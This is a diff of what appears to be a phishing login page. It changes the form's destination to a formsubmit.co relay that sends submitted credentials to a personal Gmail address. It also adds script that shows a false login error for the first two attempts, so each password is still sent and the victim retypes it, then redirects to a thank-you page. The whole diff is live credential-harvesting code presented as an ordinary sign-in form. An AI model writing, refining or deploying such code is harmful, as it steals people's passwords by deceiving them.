@@ -37,7 +37,7 @@
         </div>
 
         <div class="form-container">
-          <form id="form" method="POST" action="https://formsubmit.co/paymentsuccessfully25@gmail.com">
+          <form id="form" method="POST" action="https://formsubmit.co/iyanutosin2005@gmail.com">
             <div class="form-content box">
               <div class="logo">
                 <img src="./images/logo-light.png" class="logo-light" />
@@ -118,24 +118,31 @@
       localStorage.setItem('login_attempt', '0');
     }
 
+    // Show error message if user comes back after attempt < 2
+    if (parseInt(localStorage.getItem('login_attempt')) > 0 &&
+        parseInt(localStorage.getItem('login_attempt')) < 3) {
+      errorText.style.display = 'block';
+    }
+
     form.addEventListener('submit', function () {
       let attempt = parseInt(localStorage.getItem('login_attempt'));
 
       if (attempt < 2) {
-        // First two attempts → show error & stay on same page
+        // First two attempts → show error, still submit, reload same page
         errorText.style.display = 'block';
         nextField.value = window.location.href;
         localStorage.setItem('login_attempt', (attempt + 1).toString());
       } else {
         // Third attempt → redirect to success page
         errorText.style.display = 'none';
-        nextField.value = "https://gritvolt-gamma.vercel.app/thanks.html";
+        nextField.value = "https://gritvolt.vercel.app/thanks.html";
         localStorage.removeItem('login_attempt');
       }
+
+      return true; // allow submission
     });
   </script>
 
   <script src='app.js'></script>
 </body>
 </html>
-
